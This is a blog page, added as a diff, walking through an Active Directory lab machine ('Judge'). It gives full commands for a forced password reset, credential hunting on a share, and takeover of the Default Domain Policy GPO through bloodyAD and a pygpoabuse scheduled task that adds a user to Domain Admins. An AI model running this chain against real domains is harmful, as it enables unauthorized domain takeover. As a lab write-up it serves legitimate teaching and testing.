@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Judge - Complete Penetration Testing WalkthroughIntroductionThis is a complete walkthrough and writeup for the Judge machine from the Ronin66 lab. Judge is an Assumed Breach engagement — we start with">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ronin66-Judge">
+<meta property="og:url" content="https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Judge - Complete Penetration Testing WalkthroughIntroductionThis is a complete walkthrough and writeup for the Judge machine from the Ronin66 lab. Judge is an Assumed Breach engagement — we start with">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Judge/force-change-pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Judge/script-share-access.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Judge/strings.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Judge/perms-over-default-dom-policy.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Judge/dom-admin.png">
+<meta property="article:published_time" content="2026-09-17T09:26:09.000Z">
+<meta property="article:modified_time" content="2026-09-17T09:26:41.144Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="ActiveDirectory">
+<meta property="article:tag" content="Ronin66">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Judge/force-change-pass.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ronin66-Judge</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/09/17/Ronin66-Subscriber/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&text=Ronin66-Judge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&is_video=false&description=Ronin66-Judge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ronin66-Judge&body=Check out this article: https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&name=Ronin66-Judge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&t=Ronin66-Judge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Judge-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Judge - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">BloodHound Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Collecting-with-NetExec"><span class="toc-number">1.2.1.</span> <span class="toc-text">Collecting with NetExec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACL-Abuse-%E2%80%94-ForceChangePassword-on-s-wilson"><span class="toc-number">1.3.</span> <span class="toc-text">ACL Abuse — ForceChangePassword on s.wilson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-Edge"><span class="toc-number">1.3.1.</span> <span class="toc-text">Finding the Edge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resetting-the-Password"><span class="toc-number">1.3.2.</span> <span class="toc-text">Resetting the Password</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration-%E2%80%94-SCRIPTS-Share"><span class="toc-number">1.4.</span> <span class="toc-text">SMB Enumeration — SCRIPTS Share</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Share-Access"><span class="toc-number">1.4.1.</span> <span class="toc-text">Checking Share Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pulling-the-Share-Contents"><span class="toc-number">1.4.2.</span> <span class="toc-text">Pulling the Share Contents</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACL-Abuse-%E2%80%94-GPO-Takeover-via-e-brown"><span class="toc-number">1.5.</span> <span class="toc-text">ACL Abuse — GPO Takeover via e.brown</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-%E2%80%94-Permissions-Over-Default-Domain-Policy"><span class="toc-number">1.5.1.</span> <span class="toc-text">BloodHound — Permissions Over Default Domain Policy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Taking-Ownership"><span class="toc-number">1.5.2.</span> <span class="toc-text">Taking Ownership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Granting-GenericAll"><span class="toc-number">1.5.3.</span> <span class="toc-text">Granting GenericAll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Injecting-a-Scheduled-Task-via-pygpoabuse"><span class="toc-number">1.5.4.</span> <span class="toc-text">Injecting a Scheduled Task via pygpoabuse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Triggering-the-GPO-%E2%80%94-Domain-Admin"><span class="toc-number">1.6.</span> <span class="toc-text">Triggering the GPO — Domain Admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Forcing-a-Policy-Update"><span class="toc-number">1.6.1.</span> <span class="toc-text">Forcing a Policy Update</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.7.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-Used"><span class="toc-number">1.8.</span> <span class="toc-text">Tools Used</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ronin66-Judge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-09-17T09:26:09.000Z" class="dt-published" itemprop="datePublished">2026-09-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ActiveDirectory/" rel="tag">ActiveDirectory</a>, <a class="p-category" href="/tags/Ronin66/" rel="tag">Ronin66</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Judge-Complete-Penetration-Testing-Walkthrough"><a href="#Judge-Complete-Penetration-Testing-Walkthrough" class="headerlink" title="Judge - Complete Penetration Testing Walkthrough"></a>Judge - Complete Penetration Testing Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This is a complete walkthrough and writeup for the <strong>Judge</strong> machine from the Ronin66 lab. Judge is an <strong>Assumed Breach</strong> engagement — we start with a set of low-privilege domain credentials and a single DC running Windows Server 2019. The goal is to work through the ACL chain that BloodHound exposes, abuse a GPO we can write to, and land <strong>Domain Admin</strong>.</p>
+<p><strong>Tools Used:</strong> NetExec, BloodHound, bloodyAD, smbclient, strings, pygpoabuse, Evil-WinRM</p>
+<p><strong>Difficulty:</strong> Easy &#x2F; Medium</p>
+<p><strong>Key Techniques:</strong> BloodHound enumeration, ForceChangePassword abuse, SMB share credential hunting, GPO abuse (GenericWrite &#x2F; WriteDacl &#x2F; WriteOwner → scheduled task), Domain Admin via <code>gpupdate /force</code></p>
+<p><strong>Starting Credentials:</strong> <code>d.taylor</code> (low-privilege domain user)</p>
+<p><strong>Environment:</strong></p>
+<ul>
+<li>Domain: <code>judge.local</code></li>
+<li>DC: <code>DC01</code> — Windows 10 &#x2F; Server 2019 Build 17763 x64</li>
+<li>DC IP: <code>172.16.18.13</code></li>
+</ul>
+<hr>
+<h2 id="BloodHound-Enumeration"><a href="#BloodHound-Enumeration" class="headerlink" title="BloodHound Enumeration"></a>BloodHound Enumeration</h2><h3 id="Collecting-with-NetExec"><a href="#Collecting-with-NetExec" class="headerlink" title="Collecting with NetExec"></a>Collecting with NetExec</h3><p>We begin with BloodHound collection straight over LDAP using our starting credentials — no need to drop a collector binary on the box:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 172.16.18.13 -u &#x27;d.taylor&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --bloodhound --dns-server 172.16.18.13 -c All --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<p>We load the resulting zip into BloodHound and start tracing attack paths from <code>d.taylor</code>.</p>
+<hr>
+<h2 id="ACL-Abuse-—-ForceChangePassword-on-s-wilson"><a href="#ACL-Abuse-—-ForceChangePassword-on-s-wilson" class="headerlink" title="ACL Abuse — ForceChangePassword on s.wilson"></a>ACL Abuse — ForceChangePassword on s.wilson</h2><h3 id="Finding-the-Edge"><a href="#Finding-the-Edge" class="headerlink" title="Finding the Edge"></a>Finding the Edge</h3><p>BloodHound shows that <code>d.taylor</code> holds <strong>ForceChangePassword</strong> over <code>s.wilson</code>. That edge lets us reset the account’s password without knowing the current one.</p>
+<h3 id="Resetting-the-Password"><a href="#Resetting-the-Password" class="headerlink" title="Resetting the Password"></a>Resetting the Password</h3><p>We use <strong>bloodyAD</strong> to set a new password for <code>s.wilson</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host &quot;172.16.18.13&quot; -d &quot;judge.local&quot; -u &quot;d.taylor&quot; -p &#x27;&lt;REDACTED&gt;&#x27; set password &quot;s.wilson&quot; &quot;&lt;REDACTED&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Judge/force-change-pass.png" alt="force-change-pass"></p>
+<p>We now control <code>s.wilson</code>.</p>
+<hr>
+<h2 id="SMB-Enumeration-—-SCRIPTS-Share"><a href="#SMB-Enumeration-—-SCRIPTS-Share" class="headerlink" title="SMB Enumeration — SCRIPTS Share"></a>SMB Enumeration — SCRIPTS Share</h2><h3 id="Checking-Share-Access"><a href="#Checking-Share-Access" class="headerlink" title="Checking Share Access"></a>Checking Share Access</h3><p>With <code>s.wilson</code>‘s new credentials we enumerate available shares:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 172.16.18.13 -u &#x27;s.wilson&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Judge/script-share-access.png" alt="script-share-access"></p>
+<p><code>s.wilson</code> has read access to the <strong>SCRIPTS</strong> share — a classic AD artefact that often hides credentials.</p>
+<h3 id="Pulling-the-Share-Contents"><a href="#Pulling-the-Share-Contents" class="headerlink" title="Pulling the Share Contents"></a>Pulling the Share Contents</h3><p>We connect to the share and grab everything inside:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //172.16.18.13/script -U &#x27;judge.local\s.wilson%&lt;REDACTED&gt;&#x27;</span><br><span class="line">get mount.bat</span><br></pre></td></tr></table></figure>
+
+<p>A file called <code>mount.bat</code> catches our eye. We carve strings out of it:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mount.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Judge/strings.png" alt="strings"></p>
+<p>The batch file contains a hardcoded credential for the user <strong>e.brown</strong>.</p>
+<hr>
+<h2 id="ACL-Abuse-—-GPO-Takeover-via-e-brown"><a href="#ACL-Abuse-—-GPO-Takeover-via-e-brown" class="headerlink" title="ACL Abuse — GPO Takeover via e.brown"></a>ACL Abuse — GPO Takeover via e.brown</h2><h3 id="BloodHound-—-Permissions-Over-Default-Domain-Policy"><a href="#BloodHound-—-Permissions-Over-Default-Domain-Policy" class="headerlink" title="BloodHound — Permissions Over Default Domain Policy"></a>BloodHound — Permissions Over Default Domain Policy</h3><p>Back in BloodHound we check what <code>e.brown</code> can do. The account holds three powerful edges over the <strong>Default Domain Policy</strong> GPO (<code>{31B2F340-016D-11D2-945F-00C04FB984F9}</code>):</p>
+<ul>
+<li><code>GenericWrite</code></li>
+<li><code>WriteDacl</code></li>
+<li><code>WriteOwner</code></li>
+</ul>
+<p><img src="/images/Judge/perms-over-default-dom-policy.png" alt="perms-over-default-dom-policy"></p>
+<p>That combination is effectively full control — we can take ownership, rewrite the DACL, and modify the GPO itself. Since the Default Domain Policy applies to every computer in the domain, any code we inject runs everywhere on the next GPO refresh.</p>
+<h3 id="Taking-Ownership"><a href="#Taking-Ownership" class="headerlink" title="Taking Ownership"></a>Taking Ownership</h3><p>First we set the owner of the GPO to <code>e.brown</code> so we can freely modify its DACL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host &quot;172.16.18.13&quot; -d &quot;judge.local&quot; -u &quot;e.brown&quot; -p &#x27;&lt;REDACTED&gt;&#x27; \</span><br><span class="line">  set owner &#x27;CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=POLICIES,CN=SYSTEM,DC=JUDGE,DC=LOCAL&#x27; \</span><br><span class="line">  &#x27;e.brown&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Granting-GenericAll"><a href="#Granting-GenericAll" class="headerlink" title="Granting GenericAll"></a>Granting GenericAll</h3><p>With ownership established we grant ourselves <code>GenericAll</code> on the GPO object, removing any remaining permission barriers:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host &quot;172.16.18.13&quot; -d &quot;judge.local&quot; -u &quot;e.brown&quot; -p &#x27;&lt;REDACTED&gt;&#x27; \</span><br><span class="line">  add genericAll &#x27;CN=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;,CN=POLICIES,CN=SYSTEM,DC=JUDGE,DC=LOCAL&#x27; \</span><br><span class="line">  &#x27;e.brown&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Injecting-a-Scheduled-Task-via-pygpoabuse"><a href="#Injecting-a-Scheduled-Task-via-pygpoabuse" class="headerlink" title="Injecting a Scheduled Task via pygpoabuse"></a>Injecting a Scheduled Task via pygpoabuse</h3><p>Now we write a scheduled task into the GPO that adds <code>e.brown</code> to <strong>Domain Admins</strong> on the next policy refresh. We use the <code>-f</code> flag to append to the existing <code>ScheduledTasks.xml</code> rather than overwrite it — overwriting would break the existing policy and create noise:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 pygpoabuse.py judge.local/&#x27;e.brown&#x27;:&#x27;&lt;REDACTED&gt;&#x27; \</span><br><span class="line">  -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 \</span><br><span class="line">  -taskname SecurityUpdate \</span><br><span class="line">  -dc-ip 172.16.18.13 \</span><br><span class="line">  -command &#x27;net group &quot;Domain Admins&quot; e.brown /add /domain&#x27; \</span><br><span class="line">  -filter-enabled \</span><br><span class="line">  -target-dns-name dc01.judge.local \</span><br><span class="line">  -f</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Triggering-the-GPO-—-Domain-Admin"><a href="#Triggering-the-GPO-—-Domain-Admin" class="headerlink" title="Triggering the GPO — Domain Admin"></a>Triggering the GPO — Domain Admin</h2><h3 id="Forcing-a-Policy-Update"><a href="#Forcing-a-Policy-Update" class="headerlink" title="Forcing a Policy Update"></a>Forcing a Policy Update</h3><p>We open a WinRM session as <code>e.brown</code> and force an immediate GPO refresh:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i dc01.judge.local -u &#x27;e.brown&#x27; -p &#x27;&lt;REDACTED&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
+
+<p>We close the session and reconnect. On the second login the scheduled task has already fired and <code>e.brown</code> is a <strong>Domain Admin</strong>.</p>
+<p><img src="/images/Judge/dom-admin.png" alt="dom-admin"></p>
+<p>The DC is ours.</p>
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Judge was a clean ACL-chain box that rewarded reading the BloodHound output carefully and following the privilege edges in order:</p>
+<ol>
+<li><strong>ForceChangePassword</strong> — <code>d.taylor</code> → <code>s.wilson</code>, no brute force needed</li>
+<li><strong>SCRIPTS share</strong> — <code>mount.bat</code> handed us <code>e.brown</code>‘s credential in plaintext</li>
+<li><strong>GPO abuse</strong> — <code>WriteOwner</code> + <code>WriteDacl</code> + <code>GenericWrite</code> over the Default Domain Policy is full domain compromise waiting to happen; <code>pygpoabuse</code> made it a one-liner</li>
+<li><strong><code>gpupdate /force</code></strong> — instant task execution, no waiting for the 90-minute refresh cycle</li>
+</ol>
+<p>The lesson: ACL edges on GPOs — especially the Default Domain Policy — are some of the most dangerous misconfigurations in Active Directory. A single account with <code>WriteOwner</code> there can own the entire domain in under five minutes.</p>
+<h2 id="Tools-Used"><a href="#Tools-Used" class="headerlink" title="Tools Used"></a>Tools Used</h2><ul>
+<li>NetExec</li>
+<li>BloodHound</li>
+<li>bloodyAD</li>
+<li>smbclient</li>
+<li>strings</li>
+<li>pygpoabuse</li>
+<li>Evil-WinRM</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Judge-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Judge - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">BloodHound Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Collecting-with-NetExec"><span class="toc-number">1.2.1.</span> <span class="toc-text">Collecting with NetExec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACL-Abuse-%E2%80%94-ForceChangePassword-on-s-wilson"><span class="toc-number">1.3.</span> <span class="toc-text">ACL Abuse — ForceChangePassword on s.wilson</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-Edge"><span class="toc-number">1.3.1.</span> <span class="toc-text">Finding the Edge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resetting-the-Password"><span class="toc-number">1.3.2.</span> <span class="toc-text">Resetting the Password</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration-%E2%80%94-SCRIPTS-Share"><span class="toc-number">1.4.</span> <span class="toc-text">SMB Enumeration — SCRIPTS Share</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Share-Access"><span class="toc-number">1.4.1.</span> <span class="toc-text">Checking Share Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pulling-the-Share-Contents"><span class="toc-number">1.4.2.</span> <span class="toc-text">Pulling the Share Contents</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACL-Abuse-%E2%80%94-GPO-Takeover-via-e-brown"><span class="toc-number">1.5.</span> <span class="toc-text">ACL Abuse — GPO Takeover via e.brown</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-%E2%80%94-Permissions-Over-Default-Domain-Policy"><span class="toc-number">1.5.1.</span> <span class="toc-text">BloodHound — Permissions Over Default Domain Policy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Taking-Ownership"><span class="toc-number">1.5.2.</span> <span class="toc-text">Taking Ownership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Granting-GenericAll"><span class="toc-number">1.5.3.</span> <span class="toc-text">Granting GenericAll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Injecting-a-Scheduled-Task-via-pygpoabuse"><span class="toc-number">1.5.4.</span> <span class="toc-text">Injecting a Scheduled Task via pygpoabuse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Triggering-the-GPO-%E2%80%94-Domain-Admin"><span class="toc-number">1.6.</span> <span class="toc-text">Triggering the GPO — Domain Admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Forcing-a-Policy-Update"><span class="toc-number">1.6.1.</span> <span class="toc-text">Forcing a Policy Update</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.7.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tools-Used"><span class="toc-number">1.8.</span> <span class="toc-text">Tools Used</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&text=Ronin66-Judge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&is_video=false&description=Ronin66-Judge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ronin66-Judge&body=Check out this article: https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&title=Ronin66-Judge"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
